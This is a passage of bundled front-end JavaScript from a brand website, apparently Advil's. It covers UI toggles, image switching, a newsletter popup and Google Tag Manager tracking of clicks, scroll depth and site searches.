*")&&(e.preventDefault(),i.removeClass("content-hidden").addClass("content-visible"),a.toggleClass("closed"))})),"mouseover"===o.trigger&&t(a).on("mouseout",(function(t){i.removeClass("content-visible").addClass("content-hidden"),a.toggleClass("closed")})),window.bpComponents.bpShareContainers=window.bpComponents.bpShareContainers.add(a)})),setTimeout((function(){t(".bp-share-container.initialising").removeClass("initialising")}),250)}))}(Cog.jQuery()),function(t){t(window).on("load",(function(e){t("[tabindex]").removeAttr("tabindex");var n=0;t('a:not([style^="visibility:hidden"]):not([style^="visibility: hidden"]), button, div, input, select, textarea, .filter-container-js a, .filter-container-js li:not(.filter-group-label-js), .anchor-box, .anchor-sibling').each((function(e,r){var a=t(r);if(!a.is("[tabindex]")){if(a.is(".select-country"))return r.tabIndex=n,n++,void t('.megamenu-language-list a:not([style^="visibility:hidden"]):not([style^="visibility: hidden"]), .megamenu-language-list a').each((function(t,e){e.tabIndex=n,n++}));if(a.is(".navigation-item-title")&&t(".".concat(a.attr("data-content-class"))).length>0){var i=t(".".concat(a.attr("data-content-class")));return r.tabIndex=n,n++,void i.find("a, button, input, textarea, select").each((function(t,e){e.tabIndex=n,n++}))}if(a.is(".megamenu-main-nav > .component-content > ul > li > .navigation-item-title")&&t(".".concat(a.attr("data-content-class"))).length<1&&a.parent("li[class*=page-]").length>0){var o=a.parent("li[class*=page-]").attr("class").match(/page\-[^ ]+/i)[0].replace("page-","content-"),s=t(".".concat(o));return r.tabIndex=n,n++,void s.find("a, button, input, textarea, select").each((function(t,e){e.tabIndex=n,n++}))}a.is("div[role], div[aria-describedby]")?(r.tabIndex=n,n++):a.is("div")||a.is(".filter-container-js p")||(r.tabIndex=n),n++}})),t("body").on("keyup",(function(e){var n=t(e.target);t(".outlined").removeClass("outlined"),n.addClass("outlined"),9===e.keyCode&&(n.closest(".filter-container-js").length>0?n.closest(".filter-container-js").addClass("opened-js"):t(".filter-container-js.opened-js").removeClass("opened-js"),n.closest(".accordion-slide").length>0&&(t(".accordion-slide.is-active").removeClass("is-active"),n.closest(".accordion-slide").addClass("is-active")),n.closest(".megamenu-language-list").length>0&&(t(".accordion-slide.is-active").removeClass("is-active"),n.closest(".accordion-slide").addClass("is-active")),n.closest(".megamenu-search").length>0?n.closest(".megamenu-search").addClass("is-open"):t(".megamenu-search.is-open").removeClass("is-open"),t(".megamenu-submenu-item.opened,.megamenu-language-list.opened").removeClass("opened"),n.closest(".megamenu-submenu-item,.megamenu-language-list").length>0&&n.closest(".megamenu-submenu-item,.megamenu-language-list").addClass("opened"))})).on("click",(function(e){t(".outlined").removeClass("outlined")}))}))}(Cog.jQuery());n(116);!function(t){t("body").on("click",(function(e){try{var n=t(e.target);if(n.is(".toggler-controller")){e.preventDefault();var r=e.target.data,a=t(r.content),i=a.is(".active-js"),o=(i?r.valueOff:r.valueOn).toString().split(/, ?/g),s=r.toggle.split(/, ?/g),c=r.valueUnit.split(/, ?/g),l=i?"removeClass":"addClass",u=i?r.labelOff:r.labelOn;n.text(u)[l]("active-js"),a.css((d={},t(s).each((function(t,e){var n=o[t],r=c[t];/((min|max)\-)height$|^height$/g.test(e)&&"auto"===n&&(n=a.get(0).scrollHeight,r="px"),/^margin\-(top|bottom)$/g.test(e)&&"%"===r&&(n=a.get(0).scrollHeight*(n/100),r="px"),/^margin\-(left|right)$/g.test(e)&&"%"===r&&(n=a.get(0).scrollWidth*(n/100),r="px"),/^background\-color$|^color$|^background$/g.test(e)&&"#"===r&&(n="rgb(".concat(Object.values(hexToRgb(n)).join(),")"),r=""),d[e]="".concat(n).concat(r)})),d))[l]("active-js").attr({"aria-expanded":!i}),e.target[i?"_ondeact":"_onact"]()}}catch(t){console.warn(t)}var d})),t((function(){t(".bp-toggler").each((function(e,n){try{var r=t(n),a=r.data(),i=a.useClosestComponent?r.closest(".component.box, .component.snippetRefference, .component.accordion, .component.carousel").eq(0):t(n).parent();if(i.length<1)return void console.warn("BP TOGGLER::Toggler component can't be created without parent component (ie. box, snippetRefference, accordion, carousel)!");var o=/^[a-z_][A-Za-z0-9_]+/g.test(a.id),s=o?a.id:generateID("toggler");o||console.warn("BP TOGGLER::Invalid toggler ID ('".concat(a.id,"'). ID's should follow(^[a-z_][A-Za-z0-9_]+). This toggler is now registered as ").concat(s,"!"));var c=t('<a aria-controls="'.concat(s,'" id="').concat(s,'Controller" data-toggle="').concat(a.toggle,'" data-attr-label="').concat(a.labelOn,'" data-attr-label-inactive="').concat(a.labelOff,'" href="#" class="toggler-controller').concat(a.useClosestComponent?" ".concat(a.position," ").concat(a.positionMobile,"-m bleed-").concat(a.bleed," bleed-").concat(a.bleedMobile,"-m"):"",' active-js">').concat(a.labelOn,"</a>")).addClass(a.addButtonClasses.toString().split(/, ?/g).removeEmptyStrings().join(" ")).appendTo(i).get(0);c.data=a;var l=a.valueOn.toString().split(/, ?/g),u=a.toggle.split(/, ?/g),d=a.valueUnit.split(/, ?/g),f=a.useClosestComponent?t(c).prev(".component-content, .inner").eq(0):t(a.selector).eq(/[0-9]{1,}$/g.test(a.selectorIndex.toString())?a.selectorIndex:0),h=a.useClosestComponent?"toggler-content":"";a.useClosestComponent||f.parent().css("overflow","hidden"),c.data.content=f.attr({id:s,"aria-expanded":!0}).addClass("".concat(a.addContentClasses.toString().split(/, ?/g).removeEmptyStrings().join(" ")," active-js")).addClass(h).css((p={},t(u).each((function(t,e){var n=l[t];/((min|max)\-)height$|^height$/g.test(e)&&(n=f.get(0).scrollHeight),/^margin\-(top|bottom)$/g.test(e)&&"%"===d[t]&&(n=f.get(0).scrollHeight*(n/100),d[t]="px"),/^margin\-(left|right)$/g.test(e)&&"%"===d[t]&&(n=f.get(0).scrollWidth*(n/100),d[t]="px"),/^background\-color$|^color$|^background$/g.test(e)&&"#"===d[t]&&(n="rgb(".concat(Object.values(hexToRgb(n)).join(),")"),d[t]=""),p[e]="".concat(n).concat(d[t])})),p)).addClass("active-js").get(0),c.open=function(){var e=t(this);return e.is(".active-js")||e.trigger("click"),this},c.close=function(){var e=t(this);return e.is(".active-js")?(e.trigger("click"),this):this},c._onact=function(){Function("".concat(c.data.onActivated)).call(c,null)},c._ondeact=function(){Function("".concat(c.data.onDeactivated)).call(c,null)},bpComponents.bpTogglers||(bpComponents.bpTogglers={}),bpComponents.bpTogglers[s]=c,"off"===a.defaultState&&t(c).trigger("click"),a.useAnimation&&t("<style>\n              #".concat(s," {\n                  transition: all ").concat(a.animationTiming," ").concat(a.animationEasing," !important;\n              }\n          </style>")).appendTo(c.data.content),r.closest(".advancedParametrizedHtml, .parametrizedhtml").is(".cq-Editable-dom")||r.remove()}catch(t){console.warn(t)}var p}))}))}(Cog.jQuery()),function(t){function e(){t(".switchable-image img, .switchable-image > .component-content").hide().each((function(e,n){var r=t(n),a=r.hasClass("component-content")&&n.hasAttribute("style")?"style":r.hasClass("lazyload")?"data-src":"src";!function(t,e,n){t.attr(e).match(/_mobile\./gi)&&t.attr(e,t.attr(e).replace(/\/mobile\//gi,"/desktop/").replace(/_mobile\./gi,(n||"")+"."))}(r,a),r.hasClass("component-content")||n.complete?r.show():r.on("load",(function(){r.show()}))}))}function n(){t(".switchable-image img, .switchable-image > .component-content").hide().each((function(e,n){var r=t(n),a=r.hasClass("component-content")&&n.hasAttribute("style")?"style":r.hasClass("lazyload")?"data-src":"src";!function(t,e,n){t.attr(e).match(/_mobile\./gi)||t.attr(e,t.attr(e).replace(n,"").replace(/\/desktop\//,"/mobile/").replace(/()\.(jpg|png|svg)/gi,(function(t){return"_mobile"+t})))}(r,a),r.hasClass("component-content")||n.complete?r.show():r.on("load",(function(){r.show()}))}))}t((function(){var r=window.innerWidth,a=r;r<768&&n(),t(window).on("resize",(function(){a=r,r=window.innerWidth,a>=768&&r<768&&n(),a<768&&r>=768&&e()}))})),t(window).on("image-changed",(function(){window.innerWidth<768&&n(),window.innerWidth>=768&&e()}))}(Cog.jQuery()),function(t){function e(n){"keyup"===n.type&&27!==n.keyCode||(t(".video-content").css("display","none"),t(".video-content").html(""),t(window).off("click keyup",e))}t((function(){var n=t(".video-youtube");n.find("a, button").click((function(r){var a=decodeURIComponent(t(r.currentTarget).attr("data-v-src")),i="https://www.youtube.com/embed/"+a;return n.find(".video-content").html('<div class="video"><div class="close"></div><iframe id="ytplayer" type="text/html" width="720" height="405" src="'+i+"?autoplay=1&rel=0&loop=1&playlist="+a+'" allow="autoplay" frameborder="0" allowfullscreen></iframe></div>').css("display","flex"),t(window).on("click keyup",e),!1}))}))}(Cog.jQuery()),function(t){var e=t(".tabs-nav-list"),n=t(".tabs > .component-content"),r=t(".tabs-wrapper");function a(e){t(".tabs-content").each((function(n,r){e.append(t(this))}))}function i(){t(window).width()<768?(a(e),r.addClass("mobile-tabs")):(a(n),r.removeClass("mobile-tabs"))}t(".tabs-wrapper").length&&(t(document).ready((function(){i()})),t(window).resize((function(){i()}))),t("figcaption").length&&t("figcaption h3:contains('®')").each((function(){var e=t(this).html().replace("®","<sup>®</sup>");t(this).html(e)})),t(".breadcrumbs-list").length&&t(".breadcrumbs-list a:contains('®')").each((function(){var e=t(this).html().replace(/®/g,"<sup>®</sup>");t(this).html(e)})),t(".navigation-item").length&&t(".navigation-item a:contains('®')").each((function(){var e=t(this).html().replace(/®/g,"<sup>®</sup>");t(this).html(e)})),t(".sitemap-column").length&&t(".sitemap-column li a:contains('®')").each((function(){var e=t(this).html().replace(/®/g,"<sup>®</sup>");t(this).html(e)})),t(".searchResults-results").length&&t(".searchResults-result").each((function(){var e=t(this).html().replace(/®/g,"<sup>®</sup>");t(this).html(e)})),t(document).ready((function(){if(t(window).width()<992){var e=t("#713757751").css("background-image"),n=(e=(e=/^url\((['"]?)(.*)\1\)$/.exec(e))?e[2]:"").substr(0,e.lastIndexOf(".")),r=e.slice((Math.max(0,e.lastIndexOf("."))||1/0)+1);console.log("bg img",e),console.log(n),console.log(r);var a=n+"-mobile."+r;console.log(a),t("#713757751").css({"background-image":"url("+a+")"})}}))}(Cog.jQuery())}]);
(function ($) {
    var $newsletterGigya = $('.gigyaform-wrapper .gigyaraas.component');
    if (sessionStorage.getItem('isVisible') === 'true') {
        $newsletterGigya.addClass('content_hide');
    }

    if(!$newsletterGigya.hasClass('content_hide')){
        $('.gigyaform-wrapper .gigya-heading').addClass('active');
    }
    
    $(".gigyaform-wrapper .gigya-heading").click(function(){
        $(this).toggleClass("active")
        $newsletterGigya.toggleClass('content_hide');
        sessionStorage.setItem('isVisible', $newsletterGigya.hasClass('content_hide'));
    });
    

    // Get the current browser url.
    const url = window.location.href;
    console.log(url);
    // Selecting the body tag
    const body = document.querySelectorAll(".gigyaform-wrapper .gigyaraas.component")[0];
    // Adding a custom check to check whether the url contains our domain.
    if (url.indexOf('unsubscribe') > -1) {
        body.className += ' content_hide';
    }

    function gigyaCloseToaster() {
        $('#ciam-pch-newsletter-toaster-success').each(function() {
            if ($(this).is(':visible')){
                $('#ciam-pch-newsletter-toaster-success .gigya-button').click(function(e) {
                        $('.gigyaform-wrapper').hide();
                });
            }
        });
    }
    
    window.setInterval(gigyaCloseToaster, 100);
    if((window.location.href.indexOf("utm_source")>-1)&&(window.location.href.indexOf("utm_medium")>-1)){sessionStorage.setItem("popup","false");var gigyaform=document.querySelector(".gigyaform-wrapper");gigyaform.style.display="none"}var getPopupData=sessionStorage.getItem("popup");if(getPopupData=="false"){var gigyaform=document.querySelector(".gigyaform-wrapper");gigyaform.style.display="none"};

})(Cog.jQuery());
($ => {

    //for Custom Dimesions
    let locale = document.querySelector('html').getAttribute('lang') || "";
    let language = locale.split('-')[0].toLowerCase();
    let country = locale.split('-')[1].toLowerCase();
    window.addEventListener('load', () => {
        dataLayer.push({
            'event': 'customDimensions',
            'language': language,
            'country': country,
            'brand': 'Advil',
        });
    })

    const EXTERNAL_LINK_SELECTOR = 'a.external, a.external *';
    const VALID_LINK_SELECTOR = 'a[href]:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]), a:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]) *';

    class GTMTracker {
        static error = (msg, id) => {
            console.warn(`GTMTracker: ${msg}. In ${id}`);
        };

        static initCheck = ['eventTrigger'];
        #maxScrolled = 0;
        #config = {
            id: `gtmtracker${new Date().getTime() +
                Math.floor(Math.random() * (1000 * 1000))}`,
            eventCategory: 'Unspecified category',
            eventAction: '',
            eventTrigger: null,
            eventLabel: 'Unspecified label',
            eventTargetSelector: '',
            eventTargetClosestSelector: '',
            eventTargetParentSelector: '',
            eventTargetSharerSelector: '',
            eventTargetChildSelector: '',
            eventDelay: 0,
            pushOnce: false,
            keepMaxScroll: false,
            debug: false
        };
        #ready = false;

        constructor(config = {}) {
            Object.assign(this.#config, config);
            Object.keys(this.#config).forEach(key => {
                Object.defineProperty(this, key, {
                    get: function () {
                        return this.#config[key];
                    },
                    set: function (value) {
                        this.#config[key] = value;
                    }
                });
            });

            return this;
        }

        closest = (element, selector) => {
            if (typeof selector !== 'string') return false;
            let current = element;
            while (current !== document.documentElement) {
                if (current.matches(selector)) return current;
                current = current.parentElement;
            }
            return null;
        };

        getData = baseElement => {
            let cfg = this.#config,
                dlObject = {
                    event: 'customEvent',
                    eventCategory: cfg.eventCategory,
                    eventAction: cfg.eventAction,
                    eventLabel: cfg.eventLabel
                },
                dlObjectStringified = JSON.stringify(dlObject),
                eventIndex =
                    typeof this.eventIndex === 'number' ? this.eventIndex : false;
            if (
                typeof baseElement.matches !== 'function' &&
                cfg.eventTrigger === 'scroll'
            ) {
                baseElement = window;
            }

            if (!baseElement) {
                GTMTracker.error('No base element specified!', cfg.id);
                return false;
            }

            /*
             ** create object with macros
             ** each property represents macro
             ** {{propertyName}}
             */

            //  console.log(baseElement !== window)
            let link = window !== baseElement ? baseElement.getAttribute('href') : '',
                eh =
                    baseElement !== window
                        ? baseElement.offsetHeight
                        : window.innerHeight,
                sh =
                    (baseElement !== window
                        ? baseElement.scrollHeight
                        : document.documentElement.scrollHeight) - eh,
                st = baseElement !== window ? baseElement.scrollTop : window.scrollY,
                percScroll = (st / sh) * 100;

            this.#maxScrolled =
                this.#maxScrolled > percScroll && cfg.keepMaxScroll
                    ? this.#maxScrolled
                    : percScroll;

            let parent =
                cfg.eventTargetParentSelector !== '' && window !== baseElement
                    ? this.closest(baseElement, cfg.eventTargetParentSelector)
                    : null,
                sharer =
                    parent !== null && cfg.eventTargetSharerSelector !== ''
                        ? parent.querySelector(cfg.eventTargetSharerSelector)
                        : null,
                child =
                    cfg.eventTargetChildSelector !== ''
                        ? baseElement.querySelector(cfg.eventTargetChildSelector)
                        : null,
                baseElementIsElement =
                    baseElement !== null && typeof baseElement.matches === 'function',
                macros = {
                    text: baseElement.textContent,
                    link: link,
                    fullInternalLink: !/https?:\/\/(www\.)?/gim.test(link)
                        ? `${window.location.protocol}//${window.location.hostname}${link}`
                        : link,
                    pageUrl: window.location.href,
                    hostName: window.location.hostname,
                    rootUrl: `${window.location.protocol}://${window.location.hostname}`,
                    sharerText: sharer !== null ? sharer.textContent : 'null',
                    parentText: parent !== null ? parent.textContent : 'null',
                    parentTitle: parent !== null ? parent.getAttribute('title') : 'null',
                    sharerTitle: sharer !== null ? sharer.getAttribute('title') : 'null',
                    childTitle: child !== null ? child.getAttribute('title') : 'null',
                    childText: child !== null ? child.textContent : 'null}',
                    childLink:
                        child !== null && typeof child.getAttribute('href') !== 'undefined'
                            ? child.getAttribute('href')
                            : 'null',
                    scrollTop: baseElement.scrollTop,
                    scrollTopPercentage: `${this.#maxScrolled.toFixed(2)}%`,
                    accordionOpenedClosed: baseElementIsElement
                        ? (() => {
                            return baseElement.matches('.is-active') ? 'open' : 'close';
                        })()
                        : 'null',
                    filterSelectedLabel: baseElementIsElement
                        ? (() => {
                            return baseElement.dataset.label;
                        })()
                        : 'null',
                    articleType: () => {
                        try {
                            return parent.classList
                                .toString()
                                .match(/article-tracker-([^\s]+)/i)[1];
                        } catch (err) {
                            return '';
                        }
                    },
                    productType: () => {
                        try {
                            return parent.classList
                                .toString()
                                .match(/products-tracker-([^\s]+)/i)[1];
                        } catch (err) {
                            return '';
                        }
                    },
                    email: () => {
                        try {
                            return baseElement
                                .getAttribute('href')
                                .match(
                                    /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i
                                )[0];
                        } catch (error) {
                            return '';
                        }
                    },
                    phone: () => {
                        try {
                            return baseElement.getAttribute('href').replace(/tel\:/gi, '');
                        } catch (error) {
                            return '';
                        }
                    },
                    dropdownParentText: () => {
                        try {
                            return parent.matches('.megamenu-submenu-item')
                                ? parent.getAttribute('data-link-title')
                                : parent.previousSibling.textContent;
                        } catch (error) {
                            return '';
                        }
                    },
                    filterStatus: () => {
                        try {
                            return this.closest(baseElement, '.filter-container-js').matches(
                                '.opened-js'
                            )
                                ? 'open'
                                : 'close';
                        } catch (error) {
                            return '';
                        }
                    },
                    //Custom macros for HVA Tagging:
                    countryWithLanguage: baseElement.textContent ? baseElement.textContent.replace(')', '').split(' (').join(':') : 'null',
                    slidesCount: () => {
                        let slides = document.querySelectorAll('.hero-banner-carousel .carousel-slide:not(.clone)');
                        let slideName = document.querySelectorAll('.hero-banner-carousel .active.carousel-slide:not(.clone) .carousel-content h2')[0].textContent;
                        for (let i = 0; i < slides.length; i++) {
                            if (slides[i].classList.contains("active")) {
                                return `${i + 1} : ${slideName}`;
                            }
                        }
                    },
                    slidesCount2: () => {
                        let slides = document.querySelectorAll('.common-questions-homepage .carousel-slide');
                        let slideName = document.querySelectorAll('.common-questions-homepage .active.carousel-slide .carousel-content h3')[0].textContent;
                        for (let i = 0; i < slides.length; i++) {
                            if (slides[i].classList.contains("active")) {
                                return `${i + 1} : ${slideName}`;
                            }
                        }
                    },
                    productName: (baseElement !== null && typeof baseElement.getAttribute === "function") ? baseElement.getAttribute("data-gtm-product-name") : 'null',
                    altText: (baseElement !== null && typeof baseElement.getAttribute === "function") ? baseElement.getAttribute('alt') : 'null',
                    reviewId: (baseElement !== null && typeof baseElement.getAttribute === "function") ? baseElement.getAttribute('data-content-id') : 'null'
                };
            // loop through macros and replace every occurance in given string
            Object.entries(macros).forEach(entry => {
                if (typeof entry[1] === 'undefined' || entry[1] === null) return;
                let re = new RegExp(`\{\{${entry[0]}\}\}`, 'igm');
                entry[1] =
                    typeof entry[1].trim === 'function' ? entry[1].trim() : entry[1];
                dlObjectStringified = dlObjectStringified.replace(re, entry[1]);
            });
            // return converted string
            return {
                pushObject: JSON.parse(dlObjectStringified),
                eventIndex: eventIndex
            };
        };

        enable = () => {
            this.disabled = false;
        };

        disable = () => {
            this.disabled = true;
        };

        process = (element, isLink, link, external) => {
            if (this.disabled) {
                return;
            }
            this.disable();
            setTimeout(() => {
                this.enable();
            }, 1);
            if (
                typeof dataLayer !== 'object' ||
                !Array.isArray(dataLayer) ||
                (dataLayer && !dataLayer.hasOwnProperty('push'))
            )
                return;

            let cfg = this.#config,
                globalDebug = document.querySelectorAll('.gtm-debug').length > 0;

            if (globalDebug || cfg.debug === true) cfg.debug = true;
            else cfg.debug = false;

            if (cfg.pushOnce && !this.uniquieEventId && !this.eventIndex) {
                this.uniquieEventId =
                    dataLayer[dataLayer.length - 1]['gtm.uniqueEventId'];
                this.eventIndex = dataLayer.length - 1;
            }

            let data = this.getData(element);

            if (isLink && typeof link === 'string' && !external && !cfg.debug) {
                data.pushObject.eventCallback = function () {
                    if (element.matches('a[target="_blank"]')) window.open(link);
                    else window.location = link;
                };
            }

            if (!globalDebug) {
                if (data.eventIndex) {
                    dataLayer[data.eventIndex] = data.pushObject;
                } else {
                    dataLayer.push(data.pushObject);
                }
            }

            if (cfg.debug) console.log(JSON.stringify(data.pushObject, null, 2));
        };

        init = () => {
            let cfg = this.#config,
                canInit = true;

            if (this.#ready) {
                GTMTracker.error('Already initiated!', cfg.id);
                return this;
            }

            GTMTracker.initCheck.forEach(entry => {
                if (!cfg || cfg[entry] === null) {
                    GTMTracker.error(`${entry} not specified!`, cfg.id);
                    canProcess = false;
                    return;
                }
            });

            if (!canInit) return this;

            window.addEventListener(
                cfg.eventTrigger,
                e => {
                    if (
                        typeof dataLayer !== 'object' ||
                        !Array.isArray(dataLayer) ||
                        (dataLayer && !dataLayer.hasOwnProperty('push'))
                    ) {
                        if (typeof window._gtm_error_warned !== 'boolean') {
                            console.warn(
                                'dataLayer is not present but GTMTracker is set! Please either turn off GTMTracker or setup GTM on this page!'
                            );
                            window._gtm_error_warned = true;
                        }
                        return;
                    }
                    let isAnchor, t, matched, isElement, external, hashLink;

                    t = e.target;
                    try {
                        if (
                            t.matches(
                                '.navigation-item-decoration, .navigation-item-decoration *'
                            )
                        )
                            return;
                    } catch (error) {
                        // console.warn(error)
                        // return
                    }

                    isElement = typeof t.matches === 'function';
                    matched = isElement && t.matches(`${cfg.eventTargetSelector}`);
                    if (matched && cfg.eventTargetSelector === VALID_LINK_SELECTOR) {
                        const closestLink = this.closest(t, cfg.eventTargetClosestSelector);
                        let isExternalLink = closestLink.host.indexOf(location.host) === -1;
                        if (cfg.eventTargetSelector === VALID_LINK_SELECTOR && isExternalLink) {
                            matched = false;
                        } else if (cfg.eventTargetSelector === EXTERNAL_LINK_SELECTOR && isExternalLink) {
                            matched = true;
                        }
                    }
                    const isLink = isElement && t.matches(VALID_LINK_SELECTOR);
                    if (!matched && isLink && cfg.eventTargetSelector === EXTERNAL_LINK_SELECTOR) {
                        const closestLink = this.closest(t, cfg.eventTargetClosestSelector);
                        let isExternalLink = closestLink.host.indexOf(location.host) === -1;
                        if (cfg.eventTargetSelector === VALID_LINK_SELECTOR && isExternalLink) {
                            matched = false;
                        } else if (cfg.eventTargetSelector === EXTERNAL_LINK_SELECTOR && isExternalLink) {
                            matched = true;
                        }
                    }
                    t = matched ? this.closest(t, cfg.eventTargetClosestSelector) : t;
                    isAnchor = isElement && t.matches('a[href]');
                    hashLink =
                        isElement && isAnchor && t.matches('a[href^="#"]') ? true : false;
                    external = isAnchor && t.matches('.external');

                    if (cfg.debug || (isAnchor && !hashLink)) e.preventDefault();

                    if (matched && !t.delayed && cfg.eventTrigger !== 'scroll') {
                        if (cfg.eventDelay > 0) {
                            setTimeout(() => {
                                this.process(t, isAnchor, t.getAttribute('href'), external);
                            }, cfg.eventDelay);
                        } else {
                            this.process(t, isAnchor, t.getAttribute('href'), external);
                        }
                    }

                    if (
                        cfg.eventTrigger === 'scroll' &&
                        cfg.eventTargetSelector === 'body'
                    ) {
                        setTimeout(() => {
                            this.process(t);
                        }, cfg.eventDelay);
                    }
                },
                true
            );

            this.#ready = true;
            return this;
        };
    }

    GTMTracker.debug = () => {
        if (document.body.matches('.gtm-debug')) {
            document.body.classList.remove('gtm-debug');
            Object.entries(window.bpComponents.bpTrackers).forEach(
                entry => (entry[1].debug = false)
            );
        } else document.body.classList.add('gtm-debug');
    };

    window.GTMTracker = GTMTracker;

})(Cog.jQuery());
// Did a user read the whole page / how far has a user scrolled?
// track max user scroll progres on a page no class needed
// Category: scroll depth | Action: {{25%, 50%, 75%, 100%}} | Label: {{URL where scroll occured}}
(function ($, window, document, undefined) {

  "use strict";

  var defaults = {
    elements: [],
    minHeight: 0,
    percentage: true,
    testing: false
  },

    $window = $(window),
    cache = [];

  /*
   * Plugin
   */

  $.scrollDepth = function (options) {

    var startTime = +new Date;

    options = $.extend({}, defaults, options);

    // Return early if document height is too small
    if ($(document).height() < options.minHeight) {
      return;
    }

    // Establish baseline (0% scroll)
    sendEvent('Percentage', 'Baseline');

    /*
     * Functions
     */

    function sendEvent(action, label, timing) {
      if (!options.testing) {
        dataLayer.push({
          'event': 'customEvent',
          'eventCategory': 'scroll depth',
          'eventAction': label,
          'eventLabel': location.href
        });
      }
    }

    function calculateMarks(docHeight) {
      return {
        '25%': parseInt(docHeight * 0.25, 10),
        '50%': parseInt(docHeight * 0.50, 10),
        '75%': parseInt(docHeight * 0.75, 10),
        // 1px cushion to trigger 100% event in iOS
        '100%': docHeight - 1
      };
    }

    function checkMarks(marks, scrollDistance, timing) {
      // Check each active mark
      $.each(marks, function (key, val) {
        if ($.inArray(key, cache) === -1 && scrollDistance >= val) {
          sendEvent('Percentage', key, timing);
          cache.push(key);
        }
      });
    }

    function checkElements(elements, scrollDistance, timing) {
      $.each(elements, function (index, elem) {
        if ($.inArray(elem, cache) === -1 && $(elem).length) {
          if (scrollDistance >= $(elem).offset().top) {
            sendEvent('Elements', elem, timing);
            cache.push(elem);
          }
        }
      });
    }

    /*
     * Throttle function borrowed from:
     * Underscore.js 1.5.2
     * http://underscorejs.org
     * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
     * Underscore may be freely distributed under the MIT license.
     */

    function throttle(func, wait) {
      var context, args, result;
      var timeout = null;
      var previous = 0;
      var later = function () {
        previous = new Date;
        timeout = null;
        result = func.apply(context, args);
      };
      return function () {
        var now = new Date;
        if (!previous) previous = now;
        var remaining = wait - (now - previous);
        context = this;
        args = arguments;
        if (remaining <= 0) {
          clearTimeout(timeout);
          timeout = null;
          previous = now;
          result = func.apply(context, args);
        } else if (!timeout) {
          timeout = setTimeout(later, remaining);
        }
        return result;
      };
    }

    /*
     * Scroll Event
     */

    $window.on('scroll.scrollDepth', throttle(function () {
      /*
       * We calculate document and window height on each scroll event to
       * account for dynamic DOM changes.
       */

      var docHeight = $(document).height(),
        winHeight = window.innerHeight ? window.innerHeight : $window.height(),
        scrollDistance = $window.scrollTop() + winHeight,

        // Recalculate percentage marks
        marks = calculateMarks(docHeight),

        // Timing
        timing = +new Date - startTime;

      // If all marks already hit, unbind scroll event
      if (cache.length >= 4 + options.elements.length) {
        $window.off('scroll.scrollDepth');
        return;
      }

      // Check specified DOM elements
      if (options.elements) {
        checkElements(options.elements, scrollDistance, timing);
      }

      // Check standard marks
      if (options.percentage) {
        checkMarks(marks, scrollDistance, timing);
      }
    }, 500));

  };

  $.scrollDepth();

})(Cog.jQuery(), window, document);

(e=>{"en-US"!==e("html").attr("lang")&&"en-CA"!==e("html").attr("lang")||e(document).ready(e=>{bpComponents.bpTrackers.internalLinksTracker=new GTMTracker({id:"internalLinksTracker",eventCategory:"internal links",eventAction:"{{text}}",eventTrigger:"click",eventLabel:"{{fullInternalLink}}",eventTargetSelector:'a[href]:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]), a:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]) *',eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.externalLinksTracker=new GTMTracker({id:"externalLinksTracker",eventCategory:"external links",eventAction:"{{text}}",eventTrigger:"click",eventLabel:"{{link}}",eventTargetSelector:"a.external, a.external *",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.contactMailLinkTracker=new GTMTracker({id:"contactMailLinkTracker",eventCategory:"mailto links",eventAction:"email address click",eventTrigger:"click",eventLabel:"{{pageUrl}}",eventTargetSelector:'a[href^="mailto:"], a[href^="mailto:"] *',eventTargetClosestSelector:'a[href^="mailto:"]'}).init(),bpComponents.bpTrackers.contactPhoneLinkTracker=new GTMTracker({id:"contactPhoneLinkTracker",eventCategory:"telephone links",eventAction:"phone number click",eventTrigger:"click",eventLabel:"{{pageUrl}}",eventTargetSelector:'a[href^="tel:"], a[href^="tel:"] *',eventTargetClosestSelector:'a[href^="tel:"]'}).init()})})(Cog.jQuery());
function checkGA(){"function"==typeof ga?ga(function(e){if(Boolean(document.querySelector("body.page-site-search"))){let e=document.querySelector(".searchResults-number"),t=0;if(Boolean(e)){t=(e.childNodes[0].textContent||"").trim().split(" ")[0]}let r={event:"customEvent",eventCategory:"site search",eventAction:(document.querySelector(".searchResults-term").textContent||"").trim(),eventLabel:"results:"+t};dataLayer.push(r)}}):setTimeout(checkGA,500)}(e=>{"en-US"!==e("html").attr("lang")&&"en-CA"!==e("html").attr("lang")||e(document).ready(t=>{if(bpComponents.bpTrackers.relatedArticlesClickTracker=new GTMTracker({id:"relatedArticlesClickTracker",eventCategory:"article links",eventAction:"related",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".article-learn-more a[href]",eventTargetClosestSelector:".snippetReference",eventTargetChildSelector:".article-heading"}).init(),bpComponents.bpTrackers.brandLogoTracker=new GTMTracker({id:"brandLogoTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{altText}} logo",eventTargetSelector:".megamenu-logo a *",eventTargetClosestSelector:"img",eventTargetChildSelector:"img"}).init(),bpComponents.bpTrackers.logoGskTracker=new GTMTracker({id:"logoGskTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"GSK logo",eventTargetSelector:'a[title="GSK-logo"] *',eventTargetClosestSelector:'a[title="GSK-logo"]'}).init(),bpComponents.bpTrackers.headerTopNavTracker=new GTMTracker({id:"headerTopNavTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".megamenu .megamenu-main-nav ul.navigation-branch.navigation-level1 .navigation-level1 > a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.headerSubNavTracker=new GTMTracker({id:"headerSubNavTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{sharerText}}:{{text}}",eventTargetSelector:".megamenu-submenu-item a[href],.megamenu-submenu-item a[href] *",eventTargetClosestSelector:"a",eventTargetParentSelector:".megamenu-nav-container",eventTargetSharerSelector:".megamenu-main-nav .navigation-item.is-active a"}).init(),bpComponents.bpTrackers.headerSubNavImgTracker=new 